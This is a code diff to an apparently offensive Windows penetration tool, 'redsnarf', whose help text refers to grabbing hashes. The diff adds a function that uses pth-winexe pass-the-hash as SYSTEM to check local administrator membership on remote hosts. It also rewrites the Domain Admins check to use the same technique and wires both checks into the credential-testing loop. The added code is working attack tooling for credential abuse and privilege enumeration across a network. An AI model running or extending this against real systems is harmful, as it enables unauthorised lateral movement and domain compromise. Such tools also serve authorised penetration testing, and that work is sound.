@@ -309,7 +309,7 @@ def get_ip_address(ifname):
 
 def datadump(user, passw, host, path, os_version):
 	
-	#Temporary workaround where User has no password
+	#Exception where User has no password
 	if passw=="":
 		print colored("[+]User Detected with No Password - Be patient this could take a couple of minutes: ",'yellow')
 		
@@ -847,50 +847,37 @@ def checkport():
 	else:
 		print colored("[+]Looks like a Domain Controller",'green')
 
+def get_local_admins(ip,username,password):
+	
+	LocalAdmin=False
+
+	if username=="":
+		print colored("[-]Username is missing..",'red')
+		exit(1)
+	else:
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+ip+" \"net localgroup administrators\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+		stdout_value = proc.communicate()[0]
+		if username in stdout_value:
+			LocalAdmin = True
+		
+	return LocalAdmin	
+
+
 def get_domain_admins(ip,username,password):
 	
-	da_accounts = []
-	parsed_da_accounts = []
-			
+	DomainAdmin=False
+
 	if username=="":
-		proc = subprocess.Popen('rpcclient '+ip+' -U \"\" -N '+' -c \"querygroupmem 512\"', stdout=subprocess.PIPE,shell=True)
+		print colored("[-]Username is missing..",'red')
+		exit(1)
 	else:
-		proc = subprocess.Popen('rpcclient '+ip+' -U '+username+'%'+password +' -c \"querygroupmem 512\"', stdout=subprocess.PIPE,shell=True)
-	
-	stdout_value = proc.communicate()[0]
-
-	for line in stdout_value.split('\n'):
-		tmpline=line.lstrip()
-		tmpline=tmpline.split(' ')
-		da_accounts.append(tmpline[0].replace("rid:[", "").replace("]", ""))
-
-	if len(da_accounts)>0:
-		for sid in da_accounts:
-			
-			if username=="":
-				proc = subprocess.Popen('rpcclient '+ip+' -U \"\" -N '+'  -c \"queryuser '+sid+'\"', stdout=subprocess.PIPE,shell=True)
-			else:
-				proc = subprocess.Popen('rpcclient '+ip+' -U '+username+'%'+password +' -c \"queryuser '+sid+'\"', stdout=subprocess.PIPE,shell=True)
-			
-			stdout_value = proc.communicate()[0]
-			for line in stdout_value.split('\n'):
-				tmpline=line.lstrip()
-				
-				if "User Name   :	" in tmpline:
-					parsed_da_accounts.append(tmpline.replace("User Name   :	", "").rstrip())
-	
-	if len(parsed_da_accounts)>0:
-		for u in parsed_da_accounts:
-			
-			if username==u:
-				parsed_da_accounts=True
-				break
-			else:				
-				parsed_da_accounts=False
-	else:
-		parsed_da_accounts=False			
-
-	return parsed_da_accounts
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+		stdout_value = proc.communicate()[0]
+		
+		if username in stdout_value:
+			DomainAdmin = True
+		
+	return DomainAdmin	
 
 
 def run():
@@ -930,6 +917,12 @@ def run():
 								
 				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession()==0:
 					print colored("[+]"+host+" Creds OK, User Session Granted",'green')
+					
+					if get_local_admins(host,user,passwd):
+						print colored("[+]"+host+" Account is a Local Admin",'green')
+					else:
+						print colored("[-]"+host+" Account not found in Local Admin Group",'yellow')
+
 					#Check if account is in DA group
 					if get_domain_admins(host,user,passwd):
 						print colored("[+]"+host+" Account is a Domain Admin",'green')
@@ -1210,7 +1203,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2h", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
